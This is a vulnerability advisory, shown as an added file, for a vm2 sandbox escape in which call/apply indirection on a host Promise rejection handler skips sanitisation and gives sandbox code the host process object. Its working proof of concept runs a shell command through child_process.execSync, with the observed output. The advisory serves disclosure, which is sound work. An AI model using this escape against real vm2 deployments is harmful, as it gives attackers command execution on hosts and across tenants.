@@ -1,0 +1,28 @@
+Summary
+Untrusted JavaScript run by vm2 can escape the sandbox and execute arbitrary commands in the host Node.js process when an embedder-exposed host Promise rejects. This is an incomplete fix for GHSA-m283-3h24-438v: the advisory's capability-bearing rejection rebuild runs only through this direct Promise-handler path, so call/apply indirection bypasses the protection it introduced. The bridge sanitises host rejection values before sandbox callbacks run, but the gate at lib/bridge.js:1624 identity-checks only the direct call target. Registering the rejection handler through Function.prototype.call indirection, p.then.call(p, undefined, cb), makes the intercepted target host Function.prototype.call, so the sanitiser never runs and the raw host error reaches the sandbox (lib/bridge.js:1639) without the rebuild that strips host references carried by its own properties (lib/setup-sandbox.js:2104). A rejection error whose own property references a powerful host object, for example err.detail = process, therefore reaches sandbox code as a fully functional proxy, and e.detail.mainModule.require('child_process').execSync(...) executes with host privileges. The .apply form and a stacked call.call behave identically.
+
+PoC
+Save as poc.js and run node poc.js:
+
+const { VM } = require('vm2');
+const vm = new VM({ sandbox: {
+  fetchUser: async () => {
+    const err = new Error('db connection failed');
+    err.detail = process; // embedder-attached host reference
+    throw err;
+  },
+}});
+vm.run(`
+  const p = fetchUser(1);              // proxy of the host Promise
+  p.then.call(p, undefined, (e) => {   // .call indirection skips the sanitiser
+    e.detail.mainModule.require('child_process')
+      .execSync('echo vm2-escape-proof > /tmp/poc.proof');
+  });
+`);
+Observed output
+$ cat /tmp/poc.proof
+vm2-escape-proof
+Registering the same callback directly, p.then(undefined, cb), strips detail and no command runs; the bind and Reflect.apply forms are sanitised as well, isolating the bypass to call and apply indirection.
+
+Impact
+Any deployment that evaluates attacker-controlled code with vm2 and exposes a host-realm Promise to the sandbox is affected: an async host function bridged through the sandbox option, or a NodeVM external module's async method. If that Promise rejects with an Error carrying a non-primitive own property that references a host object, a diagnostic pattern the vm2 codebase itself documents as routine for Node libraries (lib/setup-sandbox.js:1877), a single submission yields arbitrary command execution in the host process with the host account's privileges, including file read and write, process spawning, and network access. In a multi-tenant service evaluating untrusted code, one submission compromises the worker process and every tenant it serves.
